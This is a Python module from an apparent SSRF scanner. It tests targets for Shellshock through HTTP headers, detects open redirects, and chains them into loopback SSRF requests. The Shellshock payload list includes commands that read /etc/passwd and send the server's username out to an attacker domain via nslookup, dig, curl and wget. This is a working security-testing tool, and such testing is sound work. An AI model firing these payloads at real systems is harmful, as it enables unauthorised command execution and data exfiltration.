import json
import glob
import os
from urllib.parse import urlparse, urlencode, parse_qs

from http_client import HTTPClient
from basic_checks import test_url_parameters, test_post_parameters
from utils import SSRFUtils

'''
This file tests various niche vulnerabilities specific to SSRF
'''

class SpecificVulnsTester:

    """
    A class that contains methods to test for SSRF-related vulnerabilities, including:
    - Shellshock
    - Open Redirect
    - SSRF payload generation (if needed)
    """

    def __init__(self):
        """Initialize the SpecificVulnsTester (no required args by default)."""
        pass

    def shellshock(self, file, http_client, evil_domain=None):
        """
        Tests for Shellshock vulnerabilities by sending specially-crafted payloads
        in different headers.
        """
        with open(file, "r", encoding="utf-8") as f:
            data = json.load(f)

        shellshock_payloads = [
            "() { :; }; echo Vulnerable",
            "() { :; }; /bin/bash -c 'echo Vulnerable'",
            "() { :; }; /bin/cat /etc/passwd",
            "() { :; }; /bin/id",
            "() { :; }; /usr/bin/whoami",
            f"() {{ :; }}; /usr/bin/nslookup $(whoami).{evil_domain}",
            f"() {{ :; }}; /usr/bin/dig $(whoami).{evil_domain}",
            f"() {{ :; }}; /usr/bin/curl http://$(whoami).{evil_domain}",
            f"() {{ :; }}; /usr/bin/wget -qO- http://$(whoami).{evil_domain}"
        ]

        url = data.get("URL")
        headers = data.get("Request Headers", {})
        method = data.get("Method", "GET").upper()
        original_html = data.get("HTML Content", "")

        vulnerable_headers = ["user-agent", "referer", "cookie", "host"]

        if not url:
            print("❌ No URL found in JSON file.")
            return

        parsed_url = urlparse(url)
        if not parsed_url.scheme or not parsed_url.netloc:
            print("❌ Invalid URL format.")
            return

        # Remove content-length if present
        if "content-length" in headers:
            del headers["content-length"]

        for header in vulnerable_headers:
            if header not in headers:
                continue

            counter = 0
            for payload in shellshock_payloads:
                temp_headers = headers.copy()
                temp_headers[header] = payload

                try:
                    response = http_client.send_request(method, url, temp_headers)
                    if response and response.status_code == 200:
                        counter += 1
                        similarity_ratio = SSRFUtils.compare_html(original_html, response.text)
                        if similarity_ratio < 0.95:
                            print(f"✔ **Possible** Shellshock detected on {url} "
                                  f"| Header: {header} | Payload: {payload}")
                        if counter > 3:
                            print(f"📌 3+ successful Shellshock-like responses for '{header}', moving on.")
                            break
                except Exception as e:
                    print(f"❌ Error during request: {str(e)}")

    def detect_open_redirect(self, json_files, payloads, http_client):
        """
        Tests GET and POST parameters for open redirects and stores them for SSRF testing.
        Returns a list of detected open redirects.
        """
        open_redirects = []

        for file in json_files:
            with open(file, "r", encoding="utf-8") as f:
                data = json.load(f)

            url = data.get("URL")
            headers = data.get("Request Headers", {})
            method = data.get("Method", "GET").upper()
            get_params = data.get("URL Parameters", {})
            post_params = data.get("POST Parameters", {})

            # Remove content-length if present
            if "content-length" in headers:
                del headers["content-length"]

            # Check GET parameters
            for param in get_params.keys():
                self.test_open_redirect(url, headers, param, get_params, payloads, "GET", http_client, open_redirects)

            # Check POST parameters
            for param in post_params.keys():
                self.test_open_redirect(url, headers, param, post_params, payloads, "POST", http_client, open_redirects)

        return open_redirects

    def test_open_redirect(self, url, headers, param, original_params, payloads, method, http_client, open_redirects):
        """
        Tests parameters for open redirects and saves successful detections.
        """
        if not url:
            return
        original_domain = urlparse(url).netloc

        for payload in payloads:
            modified_params = original_params.copy()
            modified_params[param] = payload

            if method == "GET":
                new_url = f"{url.split('?')[0]}?{urlencode(modified_params)}"
                response = http_client.send_request("GET", new_url, headers=headers)
            else:  # POST
                encoded = urlencode(modified_params)
                response = http_client.send_request("POST", url, headers=headers, data=encoded)

            if response and response.status_code in [301, 302, 303, 307, 308]:
                location = response.headers.get("Location", "")
                if location and urlparse(location).netloc and urlparse(location).netloc != original_domain:
                    print(f"🚨 Open Redirect Detected: {url} | Param: {param} | Payload: {payload}")
                    print(f"🔗 Redirects to: {location}\n")
                    open_redirects.append({"url": url, "param": param})

    def generate_ssrf_payloads(self, open_redirects, loopback_payloads):
        """
        Generates SSRF payloads by replacing open redirect parameters with loopback SSRF payloads.
        """
        ssrf_payload_urls = []

        for redirect in open_redirects:
            original_url = redirect["url"]
            param = redirect["param"]
            parsed_url = urlparse(original_url)

            for payload in loopback_payloads:
                modified_params = parse_qs(parsed_url.query)
                modified_params[param] = [payload]  # Replace vulnerable parameter

                new_ssrf_url = (f"{parsed_url.scheme}://{parsed_url.netloc}"
                                f"{parsed_url.path}?{urlencode(modified_params, doseq=True)}")
                ssrf_payload_urls.append(new_ssrf_url)

        return ssrf_payload_urls

    def strip_domain(self, urls):
        """
        Strips the domain from a list of URLs, leaving only the path and query parameters.
        """
        print(f"CALLED 'strip_domain'")
        stripped_urls = []
        
        for url in urls:
            parsed_url = urlparse(url)
            # Preserve path and query
            stripped_path = (f"{parsed_url.path}?{parsed_url.query}"
                             if parsed_url.query else parsed_url.path)
            stripped_urls.append(stripped_path)
        
        return stripped_urls

    def test_ssrf(self, json_files, open_redirects, loopback_payloads, allowed_host=None, attacker_host=None):

        """
        Uses generated SSRF payloads and passes them into existing SSRF testing functions.
        """
        print("🔄 Generating SSRF payload URLs...")
        ssrf_payload_urls = self.generate_ssrf_payloads(open_redirects, loopback_payloads)

        # Optionally strip domain from the SSRF URLs
        ssrf_payload_urls = self.strip_domain(ssrf_payload_urls)

        print(f"✅ {len(ssrf_payload_urls)} SSRF payloads generated. Testing now...\n")

        # Reuse test_url_parameters and test_post_parameters from the imported free-floating functions
        test_url_parameters(json_files, ssrf_payload_urls, allowed_host, attacker_host)
        test_post_parameters(json_files, ssrf_payload_urls, allowed_host, attacker_host)



open_redirect_payloads = [
    "https://google.com",
    "https://bing.com",
    "https://yahoo.com"
]